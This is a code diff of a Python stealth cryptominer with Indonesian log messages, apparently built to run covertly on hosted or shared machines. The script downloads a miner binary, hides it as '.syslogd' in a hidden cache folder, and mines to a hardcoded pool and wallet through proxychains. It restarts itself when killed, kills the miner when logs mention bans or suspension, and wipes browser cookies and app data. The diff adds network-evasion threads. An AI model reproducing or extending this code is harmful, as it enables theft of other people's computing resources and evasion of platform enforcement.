@@ -8,13 +8,14 @@ BIN_NAME = "cpuminer-sse2"
 ALIAS_BIN = ".syslogd"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.coreguard")
 POOL = "stratum+tcp://164.92.145.122:80"
-WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Icut"
+WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Ricut"
 PASSWORD = "x"
-THREADS = random.randint(1, min(7, os.cpu_count()))
-RESTART_INTERVAL = 600
 COOLDOWN_DURATION = 180
 
 BIN_PATH = os.path.join(HIDDEN_DIR, ALIAS_BIN)
+
+def get_dynamic_threads():
+    return random.randint(1, os.cpu_count())
 
 def is_cpu_100_percent():
     try:
@@ -25,7 +26,7 @@ def is_cpu_100_percent():
 def prepare_binary():
     os.makedirs(HIDDEN_DIR, exist_ok=True)
     if not os.path.isfile(BIN_PATH):
-        print("[â¬‡ï¸] Mengunduh binary miner...")
+        print("[⏳] Mengunduh binary miner...")
         urllib.request.urlretrieve(URL, TARFILE)
         with tarfile.open(TARFILE) as tar:
             tar.extractall(HIDDEN_DIR)
@@ -37,19 +38,19 @@ def proxy_exec():
     env = os.environ.copy()
     env["LD_PRELOAD"] = os.path.abspath("./libproxychains.so")
     env["PROXYCHAINS_CONF_FILE"] = os.path.abspath("./proxychains.conf")
-    cmd = [BIN_PATH, "-a", "power2b", "-o", POOL, "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"]
+    cmd = [BIN_PATH, "-a", "power2b", "-o", POOL, "-u", WALLET, "-p", PASSWORD, f"-t{get_dynamic_threads()}"]
     return subprocess.Popen(cmd, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
 
 def monitor_process(proc):
-    print(f"[ðŸ›¡ï¸] Monitoring PID: {proc.pid}")
+    print(f"[🔁] Monitoring PID: {proc.pid}")
     while True:
         if is_cpu_100_percent():
-            print(f"[ðŸ”¥] CPU 100% â€” cooldown {COOLDOWN_DURATION}s...")
+            print(f"[🔥] CPU 100% — cooldown {COOLDOWN_DURATION}s...")
             os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
             time.sleep(COOLDOWN_DURATION)
             restart_script()
         if proc.poll() is not None:
-            print("[âš ï¸] Miner mati. Restarting...")
+            print("[⚠️] Miner mati. Restarting...")
             time.sleep(5)
             new_proc = proxy_exec()
             monitor_process(new_proc)
@@ -57,7 +58,7 @@ def monitor_process(proc):
         time.sleep(10)
 
 def restart_script():
-    print("[ðŸ”] Restarting script...")
+    print("[♻️] Restarting script...")
     time.sleep(3)
     os.execl(sys.executable, sys.executable, *sys.argv)
 
@@ -143,9 +144,34 @@ def detect_system_threat():
                 with open(path, "r", errors="ignore") as f:
                     log = f.read().lower()
                     if any(k in log for k in ["suspend", "ban", "terminate", "dismiss"]):
-                        print(f"[ðŸš«] Deteksi sistem diblokir: {path}")
+                        print(f"[🚫] Deteksi sistem diblokir: {path}")
                         subprocess.call(["pkill", "-f", BIN_PATH])
             except: continue
+
+def block_google_endpoint():
+    domains = [
+        "mobilesdk-pa.clients6.google.com",
+        "firebaseinstallations.googleapis.com",
+        "googleapis.com",
+        "firebase.googleapis.com"
+    ]
+    for d in domains:
+        try:
+            subprocess.call([
+                "curl", "-s", "-H", "accept: application/dns-json",
+                f"https://cloudflare-dns.com/dns-query?name={d}&type=A"
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except: continue
+
+def extra_network_bypass():
+    try:
+        socket.create_connection(("www.cloudflare.com", 443), timeout=3).close()
+    except:
+        pass
+    try:
+        subprocess.call(["ping", "-c", "1", "1.1.1.1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except:
+        pass
 
 def clean_up():
     try:
@@ -153,13 +179,16 @@ def clean_up():
         shutil.rmtree(HIDDEN_DIR, ignore_errors=True)
     except: pass
 
-# ENTRY POINT
+# === ENTRY POINT ===
 if __name__ == "__main__":
-    print("ðŸš€ Stealth Miner Anti-Kill + Cooldown Dimulai...")
+    print("🚀 Stealth Miner Anti-Kill + Cooldown Dimulai...")
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
     threading.Thread(target=firewall_bypass, daemon=True).start()
     threading.Thread(target=detect_system_threat, daemon=True).start()
+    threading.Thread(target=block_google_endpoint, daemon=True).start()
+    threading.Thread(target=extra_network_bypass, daemon=True).start()
+
     fake_http_headers()
     clean_browser_cookies()
     clean_myapp_data()
@@ -171,7 +200,7 @@ if __name__ == "__main__":
         miner_proc = proxy_exec()
         monitor_process(miner_proc)
     except KeyboardInterrupt:
-        print("[â›”] Dihentikan manual.")
+        print("[🛑] Dihentikan manual.")
         os.killpg(os.getpgid(miner_proc.pid), signal.SIGTERM)
         clean_up()
     except Exception as e:
